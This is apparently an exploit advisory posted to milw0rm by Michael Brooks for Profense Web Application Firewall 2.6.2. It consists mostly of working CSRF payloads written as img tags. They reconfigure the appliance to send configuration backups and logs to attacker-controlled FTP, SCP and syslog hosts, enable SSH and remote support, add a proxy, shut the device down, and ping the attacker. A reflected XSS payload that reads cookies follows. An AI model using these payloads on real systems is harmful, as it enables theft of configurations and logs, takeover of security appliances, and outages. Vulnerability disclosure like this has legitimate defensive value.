<html><head><title>Profense Web Application Firewall 2.6.2 XSRF/XSS Vulnerabilities</title></head><pre>Written By Michael Brooks
Special thanks to str0ke!

Affects: Profense Web Application Firewall XSRF and XSS
Version: 2.6.2
download http://www.armorlogic.com/download_software.html

&quot;Defenses against all OWASP Top Ten vulnerabilities&quot;
 Too bad it doesn't defend its self against all of these vulnerabilities....


Chaning configuration:
DNS, SMTP,  NTP servers.
Set a (malcious) remote FTP server or SCP server to backup (steal)
configuration files.   This could be used to steal the configuraitons.
Set a remote syslog server to steal the logs
Enable SSH
Enable SNMP
&lt;img src=https://10.1.1.199:2000/ajax.html?hostname=profense.mydomain.com&amp;gateway=10.1.1.1&amp;dns=10.1.1.1&amp;smtp=10.1.1.1&amp;max_src_conn=100&amp;max_src_conn_rate_num=100&amp;max_src_conn_rate_sec=10&amp;blacklist_exp=3600&amp;ntp=ntp.hacked.com&amp;timezone=CET&amp;syslog=syslog.hacked.com&amp;syslog_ext_l=4&amp;snmp_public=public&amp;snmp_location=&amp;contact=admin%40mydomain.com&amp;ftp_server=ftp.hacked.com&amp;ftp_port=21&amp;ftp_login=user&amp;ftp_passwd=password&amp;ftp_remote_dir=%2Fhijacked_log&amp;scp_server=scp.hacked.com&amp;scp_port=22&amp;scp_login=admin&amp;scp_remote_dir=%2Fhijacked_log&amp;ftp_auto_on=on&amp;scp_auto_on=on&amp;ssh_on=on&amp;remote_support_on=on&amp;action=configuration&amp;do=save&gt;
Apply new configurations:
&lt;img src=https://10.1.1.199:2000/ajax.html?action=restart&amp;do=core&gt;

Add a proxy:
&lt;img src=https://10.1.1.199:2000/ajax.html?vhost_proto=http&amp;vhost=vhost.com&amp;vhost_port=80&amp;rhost_proto=http&amp;rhost=10.1.1.1&amp;rhost_port=80&amp;mode_pass=on&amp;xmle=on&amp;enable_file_upload=on&amp;static_passthrough=on&amp;action=add&amp;do=save&gt;

Turn off the Proface machine:
&lt;img src=https://10.1.1.199:2000/ajax.html?action=shutdown&gt;

Force the Proface server to ping:
&lt;img src=https://10.1.1.199:2000/ajax.html?action=ping&amp;ip=10.1.1.1&gt;
Could be used to nofiy the attacker that the attack succeeded.

reflective xss:
https://10.1.1.199:2000/proxy.html?action=manage&amp;main=log&amp;show=deny_log&amp;proxy=&gt;&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;

# milw0rm.com [2009-01-29]</pre></html>